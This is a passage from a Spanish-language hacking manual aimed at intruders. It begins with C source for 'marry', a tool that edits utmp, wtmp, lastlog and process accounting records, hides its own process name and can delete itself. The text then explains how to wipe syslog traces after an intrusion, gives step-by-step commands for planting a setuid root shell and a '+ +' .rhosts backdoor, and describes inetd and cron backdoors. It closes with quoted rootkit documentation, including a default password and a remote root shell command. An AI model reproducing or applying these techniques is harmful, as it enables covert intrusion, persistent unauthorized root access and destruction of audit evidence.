		case '\\':
			*(ss++)=c;
			break;
		case ' ':
			*(ss++)='\\';
			break;
		case '\t':
			*(ss++)='\\';
			c='t';
			break;
		case '\n':
			*(ss++)='\\';
			c='n';
			break;
		case '\r':
			*(ss++)='\\';
			c='r';
			break;
		case 0:
			goto end;
		}
		*(ss++)=c;
	}
end:
	*ss=0;
	return sss;
}

char *skip_white(s)
char *s;
{	for (; *s && (*s=='\t' || *s==' '); s++);
	if (!*s || (*s=='\n')) return NULL;
	return s;
}

char *g_string(d, s, size)
char *d;
char *s;
int size;
{
int y;
char c;
char f_esc=0;
	for (y=0; y<size; y++) d[y]=0;
	if (!(s=skip_white(s))) return NULL;
	if (*s=='"' && *(s+1)=='"') return s+2;
	for (y=0; y<size; s++)
	{
		c=*s;
		if (f_esc)
		{
			switch(c)
			{
			case 'r':
				c='\r';
				break;
			case 'n':
				c='\n';
				break;
			case 't':
				c='\t';
				break;
			}
			f_esc=0;
		} else {
			switch(c)
			{
			case '\\':
				f_esc=1;
				continue;
			case ' ':
			case '\t':
			case '\n':
			case '\0':
				goto end;
			}
		}
		d[y++]=c;
	}
end:
	return s+1;
}

char *time_s(tt)
time_t tt;
{
static char s[13];
	time_t t=tt; /* some compilers won't take a parameter address */
	struct tm *tp;
	tp=localtime(&t);
	sprintf(s, "%02d%02d%02d%02d%02d%02d",
		tp->tm_year, tp->tm_mon+1, tp->tm_mday,
		tp->tm_hour, tp->tm_min, tp->tm_sec);
	return s;
}
 
time_t time_i(s)
char *s;
{
	struct tm lt;
	time_t t;
	if (strlen(s)!=12) return (time_t)-1;
	time(&t);
	lt=*localtime(&t);
	lt.tm_year=atoi2(s);
	lt.tm_mon=atoi2(s+2)-1;
	lt.tm_mday=atoi2(s+4);
	lt.tm_hour=atoi2(s+6);
	lt.tm_min=atoi2(s+8);
	lt.tm_sec=atoi2(s+10);
	lt.tm_isdst=-1;
	return mktime(&lt);
}

char *
bgetgrgid(u)
gid_t u;
{
struct group *gr;
	if (!gida)
	{
		int n;
		gida=(char **)Smalloc(sizeof(char *)*MAX_UID);
		for (n=0; n<MAX_UID; n++) gida[n]=NULL; 
	}
	if (gida[u]==(char *)-1) return NULL;
	if (gida[u]) return gida[u];
	if (!(gr=getgrgid(u))) 
	{
		gida[u]=(char *)-1;
		return NULL;
	}
	gida[u]=Smalloc(strlen(gr->gr_name)+1);
	strcpy(gida[u], gr->gr_name);
	return gida[u];
}

char *
bgetpwuid(u)
uid_t u;
{
struct passwd *pw;
	if (!uida)
	{
		int n;
		uida=(char **)Smalloc(sizeof(struct passwd *)*MAX_UID);
		for (n=0; n<MAX_UID; n++) uida[n]=NULL; 
	}
	if (uida[u]==(char *)-1) return NULL;
	if (uida[u]) return uida[u];
	if (!(pw=getpwuid(u))) 
	{
		uida[u]=(char *)-1;
		return NULL;
	}
	uida[u]=Smalloc(strlen(pw->pw_name)+1);
	strcpy(uida[u], pw->pw_name);
	return uida[u];
}

#ifdef UTMP
bool dump_utmp(uline, ut)
int uline;
struct S_UTMP *ut;
{
	time_t tim;
	if (a_Pattern)
	{
		if (!match(ut->ut_user, a_Pattern) &&
		    !match(ut->ut_line, a_Pattern)
#ifdef UT_HOST
		    && !match(ut->UT_HOST, a_Pattern)
#endif
			) {if (!f_Exclude) return 1;}
		else if (f_Exclude) return 1;
	 }
	fprintf(afh, "%05x", uline-1);
	fprintf(afh, " %-8s", p_string(ut->ut_user, sizeof(ut->ut_user)));
	fprintf(afh, " %-11s", p_string(ut->ut_line, sizeof(ut->ut_line)));
#ifdef UT_ID
	fprintf(afh, " %-4s", p_string(ut->UT_ID, sizeof(ut->UT_ID)));
#endif
#ifdef UT_TYPE
	fprintf(afh, " %-2x", ut->UT_TYPE);
#endif
#ifdef UT_PID
	fprintf(afh, " %-5d", (int)ut->UT_PID);
#endif
#if defined(UT_TIME) || defined (UT_TV)
#  ifdef UT_TIME
	tim=ut->UT_TIME;
#  else
	tim=ut->UT_TV.tv_sec;
#  endif
	fprintf(afh, " %s", time_s(tim));
#endif
#ifdef UT_ADDR
	fprintf(afh, " %-15s", inet_ntoa(*((struct in_addr *)&ut->UT_ADDR)));
#endif
#ifdef UT_HOST
	fprintf(afh, " %s", p_string(ut->UT_HOST, sizeof(ut->UT_HOST)));
#endif
	fputc('\n', afh);
	return 1;
}
#endif

#ifdef LASTLOG
bool dump_lastlog(uline, ll)
int uline;
struct lastlog *ll;
{
	char *name;
	struct passwd *pw;
	if (f_Uid) 
	{
		pw=getpwuid(uline-1);
		name=pw? pw->pw_name: quotes;
	} else
	{
	  static char s[6];
	  	sprintf(s, "%05d", uline-1);
		name=s;
	}
	if (a_Pattern)
	{
		if (
		    (!uid || (uid->pw_uid!=(uline-1))) &&
		    (!f_Uid || strstr(name, a_Pattern)) &&
#ifdef LL_HOST
		    !match(ll->ll_host, a_Pattern) &&
#endif
		    !match(ll->ll_line, a_Pattern)
			) {if (!f_Exclude) return 1;}
		else if (f_Exclude) return 1;
	 }
	fprintf(afh, "%05x", uline-1);
	fprintf(afh, " %-8s", name);
	fprintf(afh, " %-11s", p_string(ll->ll_line, sizeof(ll->ll_line)));
	fprintf(afh, " %s", time_s(ll->ll_time));
#ifdef LL_HOST
	fprintf(afh, " %s", p_string(ll->LL_HOST, sizeof(ll->LL_HOST)));
#endif
	fputc('\n', afh);
	return 1;
}
#endif

#ifdef PACCT
bool dump_pacct(uline, ac)
int uline;
struct acct *ac;
{
	char *name;
	char *gr_name;
	if (!(name=bgetpwuid(ac->ac_uid)))
	{
	  static char s[6];
	  	sprintf(s, "%05d", ac->ac_uid);
		name=s;
	}
	if (!(gr_name=bgetgrgid(ac->ac_gid)))
	{
	  static char s[6];
	  	sprintf(s, "%05d", ac->ac_gid);
		gr_name=s;
	}
	if (a_Pattern)
	{
		if (
		    (!uid || (uid->pw_uid!=ac->ac_uid)) &&
		    (strstr(name, a_Pattern)) &&
		    (strstr(gr_name, a_Pattern))
			) {if (!f_Exclude) return 1;}
		else if (f_Exclude) return 1;
	}
	fprintf(afh, "%05x", uline-1);
	fprintf(afh, " %-8s", name);
	fprintf(afh, " %-8s", gr_name);
	fprintf(afh, " %-10s", p_string(ac->ac_comm, sizeof(ac->ac_comm)));
	if (ac->ac_tty==(dev_t)-1)
		fputs(" ----", afh);
	else
		fprintf(afh, " %04x", ac->ac_tty);
	fprintf(afh, " %2x", ac->ac_flag);
	fprintf(afh, " %s", time_s(ac->ac_btime));
	fputc('\n', afh);
	return 1;
}
#endif

FVOID makedump()
{
int uline;
	if ((ifh=fopen(a_Input, "r"))==NULL)
	{
		perror(a_Input);
		exit(1);
	}
	if ((afh=fopen(a_Dump, "w"))==NULL)
	{
		perror(a_Dump);
		exit(1);
	}
	fputc('\n', stdout);
	globline=0;
	mes="entries disassembled: ";
	for (uline=1; fread(mode_data, mode_size, 1, ifh)>0; uline++)
	{
		display();
		switch(mode)
		{
#ifdef UTMP
		case 'W':
			dump_utmp(uline, mode_data);
			break;
#endif
#ifdef LASTLOG
		case 'L':
			dump_lastlog(uline, mode_data);
			break;
#endif
#ifdef PACCT
		case 'A':
			dump_pacct(uline, mode_data);
			break;
#endif
		}
	}
	display_end();
	fclose(afh);
	fclose(ifh);
}

int seek_ifh(uline)
int uline;
{
	if (ftell(ifh)!=mode_size*(uline-1))
		if (fseek(ifh, mode_size*(uline-1), SEEK_SET)==-1)
			return 0;
	return 1;
}

#ifdef UTMP
int mod_utmp(ut, p)
struct S_UTMP *ut;
char *p;
{
	char *op;
static char tmp[255];
#if defined(UT_TIME) || defined(UT_TV)
#endif
	op=p;
	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
	if (!(p=g_string(ut->ut_user, p, sizeof(ut->ut_user)))) return 0;
	if (!(p=g_string(ut->ut_line, p, sizeof(ut->ut_line)))) return 0;
#ifdef UT_ID
	if (!(p=g_string(ut->UT_ID, p, sizeof(ut->UT_ID)))) return 0;
#endif
#ifdef UT_TYPE
	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
	sscanf(tmp, "%x", (unsigned int *)&(ut->UT_TYPE));
#endif
#ifdef UT_PID
	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
	ut->UT_PID=atoi(tmp);
#endif
#if defined(UT_TIME) || defined(UT_TV)
	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
#  ifdef UT_TIME
	if ((ut->UT_TIME=time_i(tmp))==(time_t)-1)
#  else /* UT_TV */
	if ((ut->UT_TV.tv_sec=time_i(tmp))==(time_t)-1)
#  endif
		fprintf(stderr, "warning: invalid time spec %s", op);
#endif
#ifdef UT_ADDR
	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
	ut->UT_ADDR=inet_addr(tmp);
#endif
#ifdef UT_HOST
	if (!(p=g_string(ut->UT_HOST, p, sizeof(ut->UT_HOST)))) return 0;
#endif
	return 1;
}
#endif

#ifdef LASTLOG
int mod_lastlog(ll, p)
struct lastlog *ll;
char *p;
{
	char *op;
static char tmp[255];
	op=p;
	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0; 
	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0; /*skip name*/
	if (!(p=g_string(ll->ll_line, p, sizeof(ll->ll_line)))) return 0;
	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
	if ((ll->ll_time=time_i(tmp))==(time_t)-1)
		fprintf(stderr, "warning illegal time: %s\n", op);
#ifdef LL_HOST
	if (!(p=g_string(ll->ll_host, p, sizeof(ll->ll_host)))) return 0;
#endif
	return 1;
}
#endif

#ifdef PACCT
int mod_pacct(ac, p)
struct acct *ac;
char *p;
{
static char tmp[255];
struct passwd *pw;
struct group *gr;
char *op;
long int t;
unsigned int tu;
	op=p;
	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0; 
	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0; 
	if (sscanf(tmp, "%ld", &t)!=1)
	{
		if (!(pw=getpwnam(tmp)))
			fprintf(stderr, "warning: unknown username %s\n", op);
		else
			ac->ac_uid=pw->pw_uid;
	} else ac->ac_uid=t;
	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0; 
	if (sscanf(tmp, "%ld", &t)!=1)
	{
		if (!(gr=getgrnam(tmp)))
			fprintf(stderr, "warning: unknown group %s\n", op);
		else
			ac->ac_gid=pw->pw_gid;
	} else ac->ac_gid=t;
	if (!(p=g_string(ac->ac_comm, p, sizeof(ac->ac_comm)))) return 0;
	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
	if (sscanf(tmp, "%x", &tu)!=1) ac->ac_tty=(dev_t)-1;
	else ac->ac_tty=tu;
	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
	if (sscanf(tmp, "%x", &tu)!=1)
		fprintf(stderr, "warning: invalid flags %s\n", op);
	else ac->ac_flag=tu;
	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
	if ((ac->ac_btime=time_i(tmp))==(time_t)-1)
		fprintf(stderr, "warning: illegal time: %s\n", op);
	return 1;
}
#endif

bool wcopy(uline)
int uline;
{
	if (!seek_ifh(uline)) return 0;
	while (fread(mode_data, mode_size, 1, ifh)>0)
	{
		display();
#ifdef PACCT
		if (f_Security && f_Auto && mode=='A')
		{
			struct acct *p; 
			p=(struct acct *)mode_data;
			if (!strncmp(p->ac_comm, ac_comm_hide, 
sizeof(ac_comm_hide)))
			{
				ac_saved.ac_btime=p->ac_btime;
				*p=ac_saved;
			}
		}
#endif
		if (fwrite(mode_data, mode_size, 1, ofh)<1) return 0;
	}
#ifndef NO_FTRUNCATE
	if (f_Squeeze && f_EditSrc) ftruncate(fileno(ofh), ftell(ofh));
#endif
	return 1;
}

bool domod(p)
char *p;
{
bool ret=0;
	if (fread(mode_data, mode_size, 1, ifh)<1) return 0;
	switch(mode)
	{
#ifdef UTMP
	case 'W':
		ret=mod_utmp(mode_data, p);
		break;
#endif
#ifdef LASTLOG
	case 'L':
		ret=mod_lastlog(mode_data, p);
		break;
#endif
#ifdef PACCT
	case 'A':
		ret=mod_pacct(mode_data, p);
		break;
#endif
	}
	if (!ret)
		fprintf(stderr, "warning: invalid dump input `%s'\n", p);
	return 1;
}

static wu_line=0;

int obj_update(uline, p, f_mod)
int uline;
char *p;
char f_mod;
{
	if (f_Squeeze)
	{
		display();
		seek_ifh(uline);
		if (f_mod) {if (!domod(p)) return 0;}
		else if (fread(mode_data, mode_size, 1, ifh)<1) return 0;
		if (fwrite(mode_data, mode_size, 1, ofh)<1) return 0;
	} else {
		if (f_EditSrc)
		{
			if (f_mod)
				fseek(ofh, mode_size*(uline-1), SEEK_SET);
		} else {
			while(++wu_line<uline)
			{
				display();
                          if (fread(mode_data, mode_size, 1, ifh)<1) return 0;
                         if (fwrite(mode_data, mode_size, 1, ofh)<1) return 0;
			}
		}
		if (f_mod)
		{
			seek_ifh(uline);
			if (!domod(p)) return 0;
			if (f_mod==2) wu_line--; 
		} else if (fread(mode_data, mode_size, 1, ifh)<1) return 0;
		if (fwrite(mode_data, mode_size, 1, ofh)<1) return 0;
		display();
	}
#ifdef PACCT
	if (f_Security && f_Auto && !f_mod && mode=='A')
		if (!uline%acct_step) ac_saved=*(struct acct *)mode_data;
#endif
	return 1;
}

FVOID makeobject()
{
int uline=1;
char line[1024];
char *p;
char f_mod;
	if ((ifh=fopen(a_Input, "r"))==NULL)
	{
		perror(a_Input);
		exit(1);
	}
	if ((afh=fopen(a_Dump, "r"))==NULL)
	{
		perror(a_Dump);
		exit(1);
	}
	if ((ofh=fopen(a_Output, f_EditSrc? "r+": "w"))==NULL)
	{
		perror(a_Output);
		exit(1);
	}
#ifdef PACCT
	if (f_Security && f_Auto && mode=='A')
		acct_step=(getpid()+8)%60;
#endif
	fputc('\n', stdout);
	globline=0;
	mes="entries assembled: ";
	while (1)
	{
		if (!fgets((p=line), sizeof(line), afh)) 
		{
			if (f_EditSrc)
			{
#ifndef NO_FTRUNCATE
				if (f_Truncate)
				{
					fflush(ofh);
                                      ftruncate(fileno(ofh), uline*mode_size);
				}
#endif
				goto closeup;
			}
			if (!f_Truncate) wcopy(uline+1);
			goto closeup;
		}
		switch (*p)
		{
		case 0:
		case '#':
		case '\n':
			continue;
		case '=': 
			f_mod=1; 
			p++; 
			break;
		case '+':
			if (f_EditSrc)
			{
				if (f_Squeeze)
                                 fprintf(stderr, "warning: the + operator can 
have \
unpredictable effects when used in conbination with -e and -s\n");
				else
				{
                               fprintf(stderr, "error: + operator used with -
e\n");
					exit(1);
				}
			}
			f_mod=2;
			p++;
			break;
		default: {f_mod=0; break;}
		}
		if (sscanf(p, "%x", &uline)!=1)
		{
			perror("invalid line number in ascii input");
			exit(1);
		}
		uline++;
		if (!obj_update(uline, p, f_mod))
 		{
			perror("read/write failed");
			exit(1);
		}
	}
closeup:
	display_end();
	fclose(ofh);
	fclose(ifh);
	fclose(afh);
}

FVOID usage(s)
char *s;
{
fprintf(stderr, "usage: %s\t[-aetsuScDn] [-i src] [-o obj] [-d dump] [-p pat]
   [-v pat] [-m [WLA]]\n\
\t\t[-E editor] [-h program]\n", s);
	exit(1);
}

int main(argc, argv)
int argc;
char **argv;
{
	char *ed;
	char c;
#ifdef PACCT
	mode='A';
#endif
#ifdef LASTLOG
	mode='L';
#endif
#ifdef UTMP
	mode='W';
#endif

	puts("marry v1.0 (c) 1991 -- Proff -- All rights reserved.");
	umask(022);
	while ((c=getopt(argc, argv, "i:o:d:aetsp:v:m:uScDnE:h:b:"))!=-1)
	switch(c)
	{
		case 'i':
			a_Input=optarg;
			break;
		case 'o':
			a_Output=optarg;
			break;
		case 'd':
			a_Dump=optarg;
			break;
		case 'a':
			f_Auto=1;
			break;
		case 'e':
			f_EditSrc=1;
			break;
		case 't':
			f_Truncate=1;
			break;
		case 's':
			f_Squeeze=1;
			break;
		case 'p':
			a_Pattern=optarg;
			break;
		case 'v':
			f_Exclude=1;
			a_Pattern=optarg;
			break;
		case 'm':
			mode=*optarg;
			break;
		case 'u':
			f_Uid=1;
			break;
		case 'S':
			f_Security=1;
			break;
		case 'c':
			f_Clean=1;
			break;
		case 'D':
			f_DeleteSelf=1;
			break;
		case 'n':
			f_NoBackups=1;
			break;
		case 'E':
			a_Editor=optarg;
			break;
		case 'h':
			a_Hide=optarg;
			break;
		case 'b':
			a_Backup=optarg;
			break;
		case '?':
		default:
                    fprintf(stderr, "%s: unknown option `%c'\n", argv[0], c);
			usage(argv[0]);
			/* NOT_REACHED */
	}
	if (a_Output && f_EditSrc)
	{
		perror("can't have -o and -e together");
		exit(1);
	}
	switch(mode)
	{
#ifdef UTMP
	case 'W':
		mode_size=sizeof(struct S_UTMP);
		mode_data=&s_utmp;
		if (!a_Input) a_Input=WTMP_FILE;
		break;
#endif
#ifdef LASTLOG
	case 'L':
		mode_size=sizeof(struct lastlog);
		mode_data=&s_lastlog;
		if (!a_Input) a_Input=LASTLOG_FILE;
		break;
#endif
#ifdef PACCT
	case 'A':
		mode_size=sizeof(struct acct);
		mode_data=&s_acct;
		if (!a_Input) a_Input=PACCT_FILE;
		break;
#endif
        default:
		fprintf(stderr, "unknown mode `%c'\n", mode);
		usage();
		/*NOT_REACHED*/
	}
	if (a_Pattern) uid=getpwnam(a_Pattern);
	if (uid) {uid_s=*uid; uid=&uid_s;}
	if (f_Auto)
	{
	struct stat st1, st2;
	int pid;
	int ws;
		if (stat(a_Editor, &st1))
		{
            fprintf(stderr, "error: editor `%s' must exist with -a (check -E 
value)\n", a_Editor);
			exit(1);
		}
		makedump();
		if (f_Security)
		{
			sprintf(ac_comm_hide, "m%d", getpid());
			symlink(a_Editor, ac_comm_hide);
			ed=ac_comm_hide;
		} else  ed=a_Editor;

		stat(a_Dump, &st1);
		if (!(pid=fork()))
		{
			printf("%s %s\n", ed, a_Dump);
			fflush(stdout);
			execlp(ed, ed, a_Dump, 0);
			perror(ed);
			_exit(1);
		}
		if (pid<0)
		{
			perror("fork");
			exit(1);
		}
		while (wait(&ws)!=pid);
		if (f_Security)
			unlink(ac_comm_hide);
		stat(a_Dump, &st2);
		if (st1.st_mtime==st2.st_mtime)
		{
                   fprintf(stderr, "`%s' not modified -- aborted\n", a_Dump);
			exit(1);
		}
		if (!a_Output || !strcmp(a_Input, a_Output))
		{
			backup(a_Input);
			f_backedup=1;
			if (!a_Output) a_Output=a_Input;
			if (!f_EditSrc)
				a_Input=a_Backup;
		}
		makeobject();
		if (f_Clean)
			unlink(a_Dump);
		if ((f_Clean || f_NoBackups) && f_backedup) unlink(a_Backup);
	}
	else if (a_Output)
		{
			if (!strcmp(a_Input, a_Output))
			{
				backup(a_Input);
				f_backedup=1;
				if (!f_EditSrc)
					a_Input=a_Backup;
			}
			makeobject();
			if (f_Clean)
				unlink(a_Dump);
			if ((f_Clean || f_NoBackups) && f_backedup) 
unlink(a_Backup);
		} else
			makedump();
	if (f_DeleteSelf) unlink(argv[0]);
	puts("Done.");
	if (f_Security)
	{
		close(0);
		close(1);
		close(2);
		setsid();
		if (a_Hide)
		{
			execlp(a_Hide, a_Hide, 0);
			perror(a_Hide);
		}
		if (f_Security)
			kill(getpid(), SIGKILL);
	}
	exit(0);
}

------------ FIN -------------------------------------------------------------

        Bien, con estos programitas hemos conseguido borrar los logs mas
  usuales (utmp, wtmp, lastlog y acct) pero tambien hemos de tener en cuenta
  otros que pueden aparecer que se comentan a continuacion:

        El demonio syslogd que guarda informacion en distintos archivos
  indicados en el /etc/syslogd.conf aunque puede estar en otras ubicaciones.
  La ventaja que tiene el log creado por el syslogd sobre los otros es que
  mientras que tanto el utmp, wtmp, lastlog y acct tienen estructura de datos
  por lo que no se pueden modificar con un editor de textos normalmente
  (aunque tampoco ofrece grandes complicaciones), los ficheros producidos por
  el daemon syslogd si que son editables en modo texto por lo que usando el
  grep con un poco de gracia deberiamos borrar la mayoria de las huellas, es
  decir buscar en modo texto mensajes que pueden referir a nuestra conexion,
  por ejemplo podemos buscar el nombre de la maquina desde la que hemos
  conectado, nuestro login ,etc.

        A continuacion indico como funciona el syslogd.conf. Algunos de los
  tipos de procesos que pueden general mensajes son los siguientes:

  kern --> mensajes relativos al kernel
  user --> mensajes relativos a procesos ejecutados por usuarios normales.
  mail --> mensajes relativos al sistema de correo.
  lpr -->  mensajes relativos a impresoras.
  auth --> mensajes relativos a programas y procesos de autentificacion 
  (aquellos en los que estan involucrados nombres de usuarios y passwords, por 
  ejemplo login, su, getty, etc)
  daemon --> mensajes relativos a otros demonios del sistema.

        Mientras que pueden generar mensajes de los siguientes tipos:

  emerg --> emergencias graves.
  alert --> problemas que deben ser solucionados con urgencia.
  crit --> errores criticos.
  err --> errores ordinarios.
  warning --> avisos.
  notice --> cuando se da una condicion que no constituye un error pero a la
             que se le debe dar una cierta atencion.
  info --> mensajes informativos.

        Una desventaja que tiene el syslogd es que puede que envie los logs a
  otra maquina con lo que seran unas huellas dificiles de borrar. Esto no es
  nada usual pero lo comento para que sepais lo que os podeis encontrar por
  ahi afuera :o(.

        En muchos sistemas corre el tcp wrapper que ofrece posibilidades
  extras como ver que maquinas se pueden conectar o no a una maquina donde
  este el tcp wrapper instalado a los distintos servicios ( usando el
  host.allow y el host.deny) y ademas puede ofrecer la posibilidad de
  establecer logs adicionales. Para controlar y borrar estos logs debes mirar
  en el syslog.conf que tambien indica los logs de los tcp wrappers.

        Ademas hemos de ver los logs del httpd, ftp, etc. que pueden tener
  distintas ubicaciones segun los distintos sistemas. Estos pueden estar en
  los mismos directorios que los tipicos utmp, wtmp, lastlog, acct o por
  ejemplo los de httpd pueden estar en el directorio donde se ubica el httpd.

        Un sistema un poco cutre que puede ayudar es hacer un find / -name
  *log* con lo que te buscara todos los archivos en la maquina que contengan
  en su nombre la palabra log con lo que te puede dar pistas de por donde
  mirar ya que muchos logs tienen la palabra log en su nombre como el
  log_access, xferlog, etc..

        Una forma de comprobar otros ficheros de log existentes en el sistema,
  es verificar cuales son todos aquellos archivos que se encuentran abiertos
  en el momento, y por ello, lo que podemos conseguir es una pista de cuales
  son algunos de los posibles lugares en los que se puede almacenar
  informacion que comprometa al usuario. Un programa para ello es el LSOF
  (LiSt Open Files), el cual nos indicar los ficheros que se encuentran
  abiertos en ese momento.

        En fin, este tema es mucho mas complejo, pero creo que extenderse mas
  se escapa de los objetivos de este texto y ademas la mejor manera de
  aprender sobre estas kosas es probando, viendo makinas, probando programas,
  etc.

  10.- PRESERVAR EL ACCESO Y PONER SNIFFERS

        Bueno, voy a dar cuatro matices sobre este tema. La idea es que tras
  haber conseguido un root es interesante instalar backdoors (o mejor una
  rootkit que es un conjunto de backdoors y otras herramientas) para seguir
  teniendo acceso como root y no tener que repetir el proceso de entrar por
  una cuenta normal, ejecutar xploit, etc,... ya que esto es un co§azo.
 
        Bueno, simplemente comento que hay backdoors para el telnetd, login,
  fingerd, y muchisimos mas, aunque lo que no hay que hacer es poner sushis o
  usar la tipica backdoor en el .rhosts o hosts.equiv ya que esos se notan
  mucho y nada mas que el root mire un poco su maquina se dara cuenta.

        De todos modos, por ser metodos que se han usado mucho y que ademas
  es posible que algun dia tengas que usarlo si estas ante un sistema
  operativo raro, voy a explicarlos un poco.

        Poner una sushi (set uid shell) consiste en que cuando seas root,
  hacer una copia de la shell, cambiarle el nombre y ponerle como owner al
  root y luego darle permisos 4755.

        Es decir... haces:

  Cp /bin/sh /directoriopublico
  Mv sh /directoriopublico
  Cd directoriopublico
  Mv sh cualquiera
  chown root cualquiera
  chmod 4755 cualquiera

        La gracia de esto es que el 4 indica que cualquiera que ejecute ese
  fichero tendra privilegios del owner de ese fichero. Asi, como el owner es
  el root y el fichero es una shell, obtendremos una shell de root con lo que
  cuando entremos a esta maquina como un usuario normal, simplemente iremos al 
  directoriopublico, ejecutamos ./cualquiera y tendremos una shell de root.

        En este momento es importante se§alar las diferencias entre UID (User 
  Identification) y EUID (Efective User Identification), es decir, cuando
  ejecuteis la sushi tendreis como UID la que tuvieseis del usuario con el
  que habeis entrado pero tendreis como EUID=0, es decir que teneis
  privilegios de root para hacerlo todo pero sin embargo si por ejemplo
  haceis un who aparecera el UID de la cuenta con la que habeis entrado y no
  aparecereis como root... tened cuidado con este tema que a veces puede
  ocasionar lios con los permisos y owners de los ficheros.

        Vale, hasta ahora todo muy bonito pero la desventaja de esto es que
  te la pueden localizar facilmente haciendo un find -perm 4000 ........ ya
  que con este comando busca ficheros que tengan estas caracteristicas del
  bit de setuid activado con lo que el root te puede pillar facilmente por lo
  que claramente es desaconsejable.

        Otro metodo, aun pero es poner un + + en el .rhosts del root. Esto
  quiere decir que cualquiera que haga un rlogin al root desde cualquier
  maquina sera root sin necesidad de password.. es decir con rlogin -l root
  maquinavictima.com. Obviamente la desventaja de esto es que el root cuando
  vea un + + en su .rhosts te pillara y esto es de lo que mas canta por lo
  que tambien es claramente desaconsejable.

        Ademas de esto hay programas que substituyen el fingerd, telnetd,
  login, etc para que cuando tu les des unos datos determinados te dejen
  entrar como root remotamente. Esta es una buena solucion aunque en algunos
  casos la longitud del fichero difiere mucho del real al troyano.. pero hay
  algun metodo mas que ya se comentara en otros textos para que no te pillen
  por este motivo. Estos troyanos estan en muchos de los lugares de la red
  asi ke dando un par de vueltas los encontrareis.. igualmente, es posible
  que esten en la misma maquina de donde os bajeis este texto. Obviamente no
  son adjuntados por no hacer esto mas grande, que ya se esta haciendo
  demasiado largo el textito de marras.. jeje

        Ademas de meter troyanos, tambien hay backdoors usando el inetd, cron
  y demas.... su funcionamiento es bastante obvio... el inetd define los
  demonios que se arrancan asociados con cada puerto por lo ke puedes poner
  asociado a un puerto raro una shell de root... respecto al cron.. es un
  programa que te permite definir tareas que se repitan periodicamente...
  puedes hacer ke todos los dias a una hora dada se modifique el archivo
  /etc/passwd, o que ejecute un socket daemon o mil kosas mas... estas dos
  backdoors ofrecen muchas posibilidades.. la putada en contra de los
  troyanos es que nada mas que el root vea el inetd.conf (en el caso del
  inetd) o el directorio cron se pueden dar cuenta facilmente.

        Lo que es bastante interesante es instalar una rootkit (el problema
  es que no estan hechas para muchos sistemas con lo que si te encuentras un
  sistema operativo para los que no las tienes te lo tienes que currar un
  poco mas :o(.. este paquete de programas te permiten desde ocultar procesos,
  ocultar directorios, borrar huellas, dejar mil backdoors, que te oculte en
  el netstat, que en el ifconfig no aparezca el famoso promiscuos si pones un
  sniffer, etc. es decir que dejas la maquina hecha un agujero. Obviamente, se
  puede definir que directorios quieres que te oculte, que backdoors quieres
  que te ponga, etc. No la adjunto en este texto ya que es bastante grande
  pero no es dificil obtenerlas en la red. Adjunto aqui unos de los programas
  que modifica una rootkit cualquiera que he pillado.. en este caso es una de
  linux (hay versiones posteriores del a§o 97 de esta rootkit):

  chfn            Trojaned! User->r00t
  chsh            Trojaned! User->r00t
  inetd           Trojaned! Remote access
  login           Trojaned! Remote access
  ls              Trojaned! Hide files
  du              Trojaned! Hide files
  ifconfig        Trojaned! Hide sniffing
  netstat Trojaned! Hide connections
  passwd  Trojaned! User->r00t
  ps              Trojaned! Hide processes
  top             Trojaned! Hide processes
  rshd            Trojaned! Remote access
  syslogd Trojaned! Hide logs
  linsniffer      A kewl sniffz0r!
  sniffit         Another kewl sniffer!
  fix             File fixer!
  z2              Zap2 utmp/wtmp/lastlog eraser!
  wted            wtmp/utmp editor!
  lled            lastlog editor!
  bindshell       port/shell type daemon!

        Y a continuacion su uso de manera breve:

        OK I will go thru how to use each program one by one. NOTE when I say 
  passwordI mean the rootkit password not your users password (doh!). By 
  default therootkit password is lrkr0x.

  chfn -          Local user->root. Run chfn then when it asks you for a new
                  name enter your password.

  chsh -          Local user->root. Run chsh when it asks you for a new shell
                  enter your password.

  inetd -         Binds a shell to a port for remote access. hehe look at the
                  source if u want this one =)

  login -         Allows login to any account with the rootkit password.
                  If root login is refused on your terminal login as "rewt".
                  History logging is disabled if you login using your
                  password.

  ls -            Trojaned to hide specified files and dirs.
                  Default data file is /dev/ptyr.
                  All files can be listed with 'ls -/'.
                  The format of /dev/ptyr is:
                  ptyr
                  hack.dir
                  w4r3z
                  ie. just the filenames. This would hide any files/dirs with
                  the names ptyr, hack.dir and w4r3z.

  du -            Same as ls, 'cept for du instead :)

  ifconfig -      Modified to remove PROMISC flag when sniffing.

  netstat -       Modified to remove tcp/udp/sockets from or to specified
                  addresses, uids and ports.
                  default data file: /dev/ptyq
                  command 0: hide uid
                  command 1: hide local address
                  command 2: hide remote address
                  command 3: hide local port
                  command 4: hide remote port
                  command 5: hide UNIX socket path

              example:
              0 500           <- Hides all connections by uid 500
              1 128.31        <- Hides all local connections from 128.31.X.X
              2 128.31.39.20  <- Hides all remote connections to 128.31.39.20
              3 8000          <- Hides all local connections from port 8000
              4 6667          <- Hides all remote connections to port 6667
              5 .term/socket  <- Hides all UNIX sockets including the path 
                                 .term/socket
       
        Yeah eyem lazy. This is ira's description. Why bother thinking  up
   werds when someones already done it?

  passwd -        Local user->root. Enter your rootkit password instead of
                  your old password.

  ps -            Modified to remove specified processes.
                  Default data file is /dev/ptyp.
                  An example data file is as follows:
                  0 0             Strips all processes running under root
                  1 p0            Strips tty p0
                  2 sniffer       Strips all programs with the name sniffer
                  Don't put in the comments, obviously.

  top -           Identical to ps, 'cept for top instead.

  rshd -          Execute remote commands as root. 
                  Usage: rsh -l rootkitpassword host command
                  ie. rsh -l lrkr0x cert.org /bin/sh -i
                      would start a root shell.

  syslogd -       Modified to remove specified strings from logging.
                  I thought of this one when I was on a system which logged
                  every connection.. I kept getting pissed off with editing
                  files every time I connected to remove my hostname. Then I 
                  thought 'Hey dude, why not trojan syslogd?!' and the rest
                  is history. :)
                  Default data file is /dev/ptys
                  Example data file:
                  evil.com
                  123.100.101.202
                  rshd
